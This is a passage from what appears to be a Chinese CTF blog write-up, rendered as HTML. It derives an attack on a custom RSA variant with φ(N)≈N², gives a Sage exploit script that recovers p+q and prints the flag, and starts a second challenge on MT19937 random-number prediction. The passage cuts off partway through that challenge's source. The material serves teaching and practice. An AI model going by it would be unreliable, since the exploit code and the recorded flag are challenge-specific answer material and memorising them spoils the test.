style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p>
+<h4 id="关键近似"><a class="markdownIt-Anchor" href="#关键近似"></a> 关键近似</h4>
+<p>令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m = p+q</span><br><span class="line">N = pq</span><br></pre></td></tr></table></figure>
+<p>则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p²+q² = m² - 2N</span><br></pre></td></tr></table></figure>
+<p>最终：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>φ</mi><mrow><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow></msub><mo>=</mo><msup><mi>N</mi><mn>2</mn></msup><mo>+</mo><mi>N</mi><mi>m</mi><mo>+</mo><msup><mi>m</mi><mn>2</mn></msup><mtext>−</mtext><mi>N</mi><mo>+</mo><mi>m</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">φ_{(N)}=N^2+Nm+m^2−N+m+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7857599999999999em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p>
+<p>又<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>≡</mo><mn>1</mn><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed≡1\ (mod\ φ(N))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p>
+<p>所以：</p>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>=</mo><mi>k</mi><msub><mi>φ</mi><mrow><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow></msub><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">ed=kφ_{(N)}+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.04964em;vertical-align:-0.3551999999999999em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p>
+<p>-&gt;</p>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>d</mi><mo>−</mo><mn>1</mn><mo>=</mo><mi>k</mi><msub><mi>φ</mi><mrow><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">ed-1=kφ_{(N)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.04964em;vertical-align:-0.3551999999999999em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal">φ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span></span></span></span></p>
+<p>因为</p>
+<ul>
+<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>≈</mo><msup><mn>2</mn><mn>1024</mn></msup></mrow><annotation encoding="application/x-tex">N ≈ 2^{1024}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></span></li>
+<li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>≈</mo><msup><mn>2</mn><mn>512</mn></msup></mrow><annotation encoding="application/x-tex">m ≈ 2^{512}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.48312em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></li>
+</ul>
+<p>所以：</p>
+<table>
+<thead>
+<tr>
+<th>项</th>
+<th>数量级</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>N²</td>
+<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>2048</mn></msup></mrow><annotation encoding="application/x-tex">2^{2048}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">4</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span></span></td>
+</tr>
+<tr>
+<td>N*m</td>
+<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>1536</mn></msup></mrow><annotation encoding="application/x-tex">2^{1536}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span><span class="mord mtight">3</span><span class="mord mtight">6</span></span></span></span></span></span></span></span></span></span></span></span></td>
+</tr>
+<tr>
+<td>m²</td>
+<td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>1024</mn></msup></mrow><annotation encoding="application/x-tex">2^{1024}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span></span></span></span></span></span></span></span></td>
+</tr>
+</tbody>
+</table>
+<p>φ(N)的主导项是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>N</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">N^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></p>
+<p>因此：</p>
+<p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>≈</mo><msup><mi>N</mi><mn>2</mn></msup><mo>≈</mo></mrow><annotation encoding="application/x-tex">φ(N)≈N^2≈</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span></span></span></span><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>2048</mn></msup></mrow><annotation encoding="application/x-tex">2^{2048}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span><span class="mord mtight">4</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span></span></p>
+<h4 id="求k"><a class="markdownIt-Anchor" href="#求k"></a> 求k</h4>
+<p><img src="../images/image-20260308234529950.png" alt="image-20260308234529950" /></p>
+<p>为什么k要这样算：<br />
+<img src="../images/image-20260308234622935.png" alt="image-20260308234622935" /></p>
+<h4 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h4>
+<p>我们的最终目的是恢复p和q</p>
+<p>如何得到p、q呢：<br />
+<img src="../images/image-20260308235450412.png" alt="image-20260308235450412" /></p>
+<p><strong>目标 1：求 p+q</strong></p>
+<p>而φ(N)是一个有关p、q关系式的变量</p>
+<p>所以我们得先求出φ(N)</p>
+<p><strong>目标 2：求 φ(N)</strong></p>
+<p>φ(N)又与k、d有关系式，得先求k和d</p>
+<p>k可以用<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>d</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>N</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">(ed-1)\\N^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>向下枚举得到</p>
+<p>而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>N</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">N^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>我们已知，只需要求d</p>
+<p><strong>目标 3：求 d</strong></p>
+<p>而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>N</mi><mn>0.47</mn></msup></mrow><annotation encoding="application/x-tex">d=N^{0.47}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">4</span><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span></p>
+<p>即直接得到d</p>
+<p>完整思路链：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">目标: p,q</span><br><span class="line">     ↓</span><br><span class="line">需要: p+q</span><br><span class="line">     ↓</span><br><span class="line">需要: φ(N)</span><br><span class="line">     ↓</span><br><span class="line">需要: ed-<span class="number">1</span> = kφ(N)</span><br><span class="line">     ↓</span><br><span class="line">需要: d</span><br><span class="line">     ↓</span><br><span class="line">d = N^<span class="number">0.47</span> (题目给)</span><br><span class="line">     ↓</span><br><span class="line">计算 ed-<span class="number">1</span></span><br><span class="line">     ↓</span><br><span class="line">利用 φ(N)≈N²</span><br><span class="line">估算 k</span><br><span class="line">     ↓</span><br><span class="line">枚举得到 φ(N)</span><br><span class="line">     ↓</span><br><span class="line">解方程得到 p+q</span><br><span class="line">     ↓</span><br><span class="line">求 p,q</span><br></pre></td></tr></table></figure>
+<p>EXP:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">e = <span class="number">20285928988408708385825788658664300305494782819689883492429762785687493161646901961627732482030570554944571523044008931416609595056746847083499405860944240804200816473153171825246196297214879750749954991916614158499347588230595409852985660426387332691700171974951765953937059128044510635005259571262430221092123685629379451869171518153057333553882827808279895371867053070597655168641441209936240962391624079704514097507822408340977683148014817264999772615710237278286803551400605422497036878844692741788304043681532328471441465596285604159664321904195632202009921776619257725630740166796422445907541165144233376010917</span></span><br><span class="line">N = <span class="number">162318864198120848289602513685294100213662002310524040016141267082602211702801751627271587107738223466644399363879018058536864307889254050305605097781721847474240769410050480646447538698253600786017599233831714710010395996308361674973789283465587010960323042209564459904257042660293061844258544118566558516881</span></span><br><span class="line"><span class="comment">#求d</span></span><br><span class="line">d = Integer(Integer(N) ** RR(<span class="number">0.47</span>))</span><br><span class="line">target = e * d - <span class="number">1</span></span><br><span class="line">k = target // (N ** <span class="number">2</span>)</span><br><span class="line"><span class="comment">#一步步枚举k，直到(e*d-1)/(N**2)是个整数</span></span><br><span class="line"><span class="keyword">while</span> (target % k != <span class="number">0</span>):</span><br><span class="line">    k -= <span class="number">1</span></span><br><span class="line"><span class="comment">#求φ(N)</span></span><br><span class="line">phi = target // k</span><br><span class="line"><span class="comment">#设s=p+q，求有关s的一元二次方程，按求根公式Δ=b^2−4ac</span></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = N + <span class="number">1</span></span><br><span class="line">c = N ** <span class="number">2</span> - N + <span class="number">1</span> - phi</span><br><span class="line">delta = b ** <span class="number">2</span> - <span class="number">4</span> * a * c</span><br><span class="line"><span class="keyword">assert</span> delta &gt; <span class="number">0</span></span><br><span class="line"><span class="comment">#s等于delta开平方，rem == 0说明delta是完全平方数</span></span><br><span class="line">s, rem = delta.sqrtrem()</span><br><span class="line"><span class="keyword">if</span> rem == <span class="number">0</span>:</span><br><span class="line">    flag = <span class="string">&#x27;flag&#123;&#x27;</span> + hashlib.md5(<span class="built_in">str</span>(s).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;09abda5461517b85e18976e4347a3de3&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="尽人事听天命mt19937-random预测"><a class="markdownIt-Anchor" href="#尽人事听天命mt19937-random预测"></a> <strong>尽人事，听天命(MT19937 random预测)</strong></h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> seed,yin,yang</span><br><span class="line"></span><br><span class="line">signs = [<span class="string">&#x27;大吉&#x27;</span>, <span class="string">&#x27;中吉&#x27;</span>, <span class="string">&#x27;小吉&#x27;</span>, <span class="string">&#x27;吉&#x27;</span>, <span class="string">&#x27;末吉&#x27;</span>, <span class="string">&#x27;凶&#x27;</span>, <span class="string">&#x27;大凶&#x27;</span>]</span><br><span class="line">colors = [<span class="string">&#x27;赤&#x27;</span>, <span class="string">&#x27;橙&#x27;</span>, <span class="string">&#x27;黄&#x27;</span>, <span class="string">&#x27;青&#x27;</span>, <span class="string">&#x27;蓝&#x27;</span>, <span class="string">&#x27;紫&#x27;</span>, <span class="string">&#x27;黑&#x27;</span>, <span class="string">&#x27;白&#x27;</span>]</span><br><span class="line">pool = []</span><br><span class="line">count = <span class="number">2495</span></span><br><span class="line">bits = <span class="number">32</span></span><br><span class="line">kbits = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_omen</span>():</span><br><span class="line">    <span class="keyword">global</span> pool</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pool:</span><br><span class="line">        x = random.getrandbits(<span class="number">32</span>)</span><br><span class="line">        pool = [x &amp; <span class="number">0xff</span>, (x &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>, (x &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>, (x &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>]</span><br><span class="line">    <span class="keyword">return</span> pool.pop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_book</span>(<span class="params">name</span>):</span><br><span class="line">    t = next_omen()</span><br><span class="line">    a = t % <span class="number">101</span></span><br><span class="line">    b = (t * <span class="number">3</span> + <span class="number">7</span>) % <span class="number">101</span></span><br><span class="line">    c = (t * <span class="number">5</span> + <span class="number">11</span>) % <span class="number">101</span></span><br><span class="line">    d = (t * <span class="number">7</span> + <span class="number">13</span>) % <span class="number">101</span></span><br><span class="line">    color = colors[t &amp; <span class="number">7</span>]</span><br><span class="line">    sign = signs[(t &gt;&gt; <span class="number">1</span>) % <span class="built_in">len</span>(signs)]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">        <span class="string">&#x27;【天命阁命书】&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;有缘人：<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;命途：<span class="subst">&#123;a&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;福缘：<span class="subst">&#123;b&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;财势：<span class="subst">&#123;c&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;劫数：<span class="subst">&#123;d&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">f&#x27;吉色：<span class="subst">&#123;color&#125;</span>&#x27;</span>,</span><br><span class="line">        <span 